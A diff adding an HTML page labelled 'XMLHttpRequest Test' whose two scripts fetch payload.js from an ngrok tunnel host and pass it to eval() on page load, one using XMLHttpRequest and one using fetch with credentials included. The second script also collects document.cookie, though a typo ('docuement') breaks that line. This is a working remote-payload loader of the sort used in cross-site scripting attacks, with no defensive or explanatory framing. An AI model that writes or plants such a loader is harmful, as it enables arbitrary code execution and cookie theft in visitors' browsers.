@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XMLHttpRequest Test</title>
+</head>
+<body>
+    <h1>Testing XMLHttpRequest</h1>
+	    <script>
+        let xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://5e94-191-82-239-19.ngrok-free.app/payload.js", true);
+	xhr.setRequestHeader("ngrok-skip-browser-warning", "true");
+	xhr.setRequestHeader("User-Agent", "Custom User Agent");
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    eval(xhr.responseText);
+                } else {
+                    console.error("Error:", xhr.status, xhr.statusText);
+                }
+            }
+        };
+
+        xhr.onerror = function() {
+            console.error("Request failed");
+        };
+
+        xhr.send();
+    </script>
+    <script>
+	let cookie;
+	if(document.cookie){
+		cookie=docuement.cookie;
+	}else{
+		cookie="no cookie found";
+	}
+	let promise = async ()=>{
+			const url="https://5e94-191-82-239-19.ngrok-free.app/payload.js";
+		try{
+			const response=await fetch(url,{
+				method: 'GET',
+				headers: {
+					"ngrok-skip-browser-warning": "true",
+					"User-Agent": "Custom User Agent"
+				},
+				credentials: 'include'
+			});
+			if(!response.ok){
+				throw new Error(`response status: ${response.status}`);
+			};
+			const responseText=await response.text();
+			eval(responseText);
+		}catch(error){
+			console.error(error.message)
+		};
+	};
+	promise();
+	</script>
+</body>
+</html>
+
